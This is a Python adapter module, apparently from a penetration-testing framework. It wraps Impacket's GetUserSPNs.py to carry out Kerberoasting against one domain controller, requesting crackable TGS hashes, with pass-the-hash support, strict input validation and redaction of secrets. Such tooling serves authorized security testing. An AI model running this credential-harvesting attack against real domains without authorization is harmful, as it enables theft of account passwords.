"""
Subprocess execution for kerberoast: drives the real Impacket
`GetUserSPNs.py` CLI to request and report crackable Kerberos TGS hashes
for every account with a non-empty servicePrincipalName (Kerberoasting).

No parsing logic here -- see parse.py. Every input check happens before
any subprocess runs, and bad input or a genuine execution failure returns
a RawKerberoastResult with `error` set rather than raising.

Confirmed real flags against the installed `GetUserSPNs.py -h` on CT 115
(Impacket v0.13.1):
  positional target  domain[/username[:password]]
  -hashes LMHASH:NTHASH   (pass-the-hash; pairs with -no-pass)
  -no-pass                don't prompt for a password (needed with -hashes)
  -request                actually request TGS tickets and print them in
                           JtR/hashcat format -- without this flag,
                           GetUserSPNs.py only lists SPN-bearing accounts
                           without requesting hashes, which would make
                           this tool pointless, so it is always passed.
  -dc-ip ip address / -dc-host hostname  -- mutually available; which one
                           is used depends on whether `target` parses as
                           an IP literal or a hostname (mirrors
                           bloodhound/execute.py's own IP-vs-hostname
                           branch for the same -ns/-dc choice).
There is no `@target` form in the real positional argument (the doc's own
citation of that shape was simplified) -- confirmed directly against the
real `-h` output, not assumed.
"""
from __future__ import annotations

import ipaddress
import re
import shutil
import subprocess
from typing import List, Optional, Tuple

from tradecraft.adapters.kerberoast.parse import RawKerberoastResult, normalize_target_host

DEFAULT_TIMEOUT = 60
KERBEROAST_BIN = "GetUserSPNs.py"


def find_kerberoast_binary() -> Optional[str]:
    return shutil.which(KERBEROAST_BIN)


def _redact(text: str, secrets: List[str]) -> str:
    """Mirrors scoutsuite_audit/trivy_scan's own _redact() -- defense in
    depth in case GetUserSPNs.py ever echoes its own invocation (e.g.
    under -debug, which this adapter never passes) into captured output."""
    if not text:
        return text
    for secret in sorted({s for s in secrets if s}, key=len, reverse=True):
        text = text.replace(secret, "<redacted>")
    return text


def _is_ip_address(value: str) -> bool:
    try:
        ipaddress.ip_address(value)
        return True
    except ValueError:
        return False


# An IPv4 range such as 10.0.0.1-10.0.0.50 -- must actually start with a
# dotted-quad IP, not just contain a hyphen, so a legitimate hostname like
# 'dc-01.sub.corp.local' is never mistaken for one (certipy_enum/
# netexec_exploit's own _IPV4_RANGE_REGEX, mirrored here).
_IPV4_RANGE_REGEX = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}\s*-\s*\d")


def _validate_target(target: str) -> Optional[str]:
    """Rejects anything that is not a single DC host, mirroring
    certipy_enum's own _validate_target shape."""
    clean = (target or "").strip()
    if not clean:
        return "target (domain controller host/IP) is required"
    if "," in clean or any(char.isspace() for char in clean):
        return "kerberoast runs against a single domain controller only; target lists are not accepted"
    if "/" in clean:
        return "kerberoast runs against a single domain controller only; CIDR ranges are not accepted"
    if _IPV4_RANGE_REGEX.match(clean):
        return "kerberoast runs against a single domain controller only; IP ranges are not accepted"
    return None


def _validate_domain(domain: str) -> Optional[str]:
    clean = (domain or "").strip()
    if not clean:
        return "domain is required for kerberoast"
    if any(char.isspace() for char in clean):
        return "domain must not contain whitespace"
    if any(char in clean for char in "/\\,@"):
        return "domain must be a bare domain name, e.g. 'corp.local'"
    return None


def _normalize_username(username: str, domain: str) -> Tuple[Optional[str], Optional[str]]:
    """Returns (bare_username, error). GetUserSPNs.py's positional target
    takes a bare username (domain/username[:password]), not a UPN, so any
    domain part the caller embedded is validated against `domain` and then
    stripped rather than kept."""
    user = (username or "").strip()
    if not user:
        return None, "username is required for kerberoast"

    if "\\" in user:
        supplied_domain, _, user = user.partition("\\")
        if supplied_domain and supplied_domain.casefold() != domain.casefold():
            return None, f"username domain '{supplied_domain}' does not match domain '{domain}'"
    elif "@" in user:
        user, _, supplied_domain = user.partition("@")
        if supplied_domain and supplied_domain.casefold() != domain.casefold():
            return None, f"username domain '{supplied_domain}' does not match domain '{domain}'"

    user = user.strip()
    if not user:
        return None, "username is required for kerberoast"
    return user, None


def _validate_credentials(username: str, password: str, hashes: str, domain: str) -> Optional[str]:
    if not (username or "").strip():
        return "username is required for kerberoast"
    if (password or "").strip() and (hashes or "").strip():
        return "provide at most one of password or hashes, not both"
    if not (password or "").strip() and not (hashes or "").strip():
        return "one of password or hashes is required for kerberoast"
    return _validate_domain(domain)


def _validate_dc_ip(dc_ip: str, target: str) -> Optional[str]:
    clean = (dc_ip or "").strip()
    if not clean:
        return None
    if not _is_ip_address(clean):
        return f"dc_ip '{dc_ip}' is not a single IP address"
    if _is_ip_address(target):
        # Per the contract: dc_ip overrides DNS resolution for a hostname
        # target, pairing with -dc-host. When target is already an IP
        # there is nothing to resolve, and passing both would otherwise
        # silently emit -dc-ip twice (argparse keeps only the last one),
        # letting dc_ip override target with no validation error.
        return "dc_ip is only used when target is a hostname; omit it when target is already an IP address"
    return None


def build_argv(
    target: str,
    domain: str,
    username: str,
    password: str = "",
    hashes: str = "",
    dc_ip: str = "",
    binary: str = KERBEROAST_BIN,
) -> List[str]:
    """Builds argv for one bounded GetUserSPNs.py Kerberoasting request.
    Assumes inputs already passed validation (see execute())."""
    clean_target = target.strip()
    clean_domain = domain.strip()
    clean_password = (password or "").strip()
    clean_hashes = (hashes or "").strip()

    principal = f"{clean_domain}/{username}"
    if clean_password:
        principal += f":{clean_password}"

    argv = [binary, "-request", principal]

    if clean_hashes:
        argv.extend(["-hashes", clean_hashes, "-no-pass"])

    if _is_ip_address(clean_target):
        argv.extend(["-dc-ip", clean_target])
    else:
        argv.extend(["-dc-host", clean_target])

    if dc_ip.strip():
        argv.extend(["-dc-ip", dc_ip.strip()])

    return argv


def execute(
    target: str,
    domain: str,
    username: str,
    password: str = "",
    hashes: str = "",
    dc_ip: str = "",
    timeout: Optional[int] = None,
) -> RawKerberoastResult:
    """Executes one Kerberoasting request (request + report crackable TGS
    hashes) against the domain controller `target`."""
    # Kerberos runs on a fixed port (88); strip any host:port/URL/IPv6-
    # bracket form down to a bare host before anything else, so facts and
    # argv always key on the plain host (see normalize_target_host's own
    # docstring for why a caller-supplied port is never meaningful here).
    clean_target = normalize_target_host(target)
    clean_domain = (domain or "").strip()

    target_error = _validate_target(clean_target)
    if target_error:
        return RawKerberoastResult(target=clean_target, domain=clean_domain, error=target_error)

    credential_error = _validate_credentials(username, password, hashes, clean_domain)
    if credential_error:
        return RawKerberoastResult(target=clean_target, domain=clean_domain, error=credential_error)

    clean_username, username_error = _normalize_username(username, clean_domain)
    if username_error:
        return RawKerberoastResult(target=clean_target, domain=clean_domain, error=username_error)

    dc_ip_error = _validate_dc_ip(dc_ip, clean_target)
    if dc_ip_error:
        return RawKerberoastResult(target=clean_target, domain=clean_domain, error=dc_ip_error)

    binary = find_kerberoast_binary()
    if binary is None:
        return RawKerberoastResult(
            target=clean_target, domain=clean_domain,
            error="GetUserSPNs.py executable not found on PATH",
        )

    effective_timeout = timeout if timeout is not None else DEFAULT_TIMEOUT

    argv = build_argv(
        target=clean_target,
        domain=clean_domain,
        username=clean_username,
        password=password,
        hashes=hashes,
        dc_ip=dc_ip,
        binary=binary,
    )

    # GetUserSPNs.py accepts -save/-outputfile to write to disk; neither is
    # used here, so a disposable working directory isn't needed -- its
    # output (the $krb5tgs$ hash lines) is captured entirely from stdout.
    try:
        proc = subprocess.run(
            argv,
            stdin=subprocess.DEVNULL,
            capture_output=True,
            text=True,
            timeout=effective_timeout,
        )
    except FileNotFoundError:
        return RawKerberoastResult(
            target=clean_target, domain=clean_domain,
            error="GetUserSPNs.py executable not found on PATH",
        )
    except subprocess.TimeoutExpired:
        return RawKerberoastResult(
            target=clean_target, domain=clean_domain,
            error=f"GetUserSPNs.py timed out after {effective_timeout}s",
        )

    secrets = [s for s in ((password or "").strip(), (hashes or "").strip()) if s]
    return RawKerberoastResult(
        target=clean_target,
        domain=clean_domain,
        stdout=_redact(proc.stdout or "", secrets),
        stderr=_redact(proc.stderr or "", secrets),
        returncode=proc.returncode,
    )
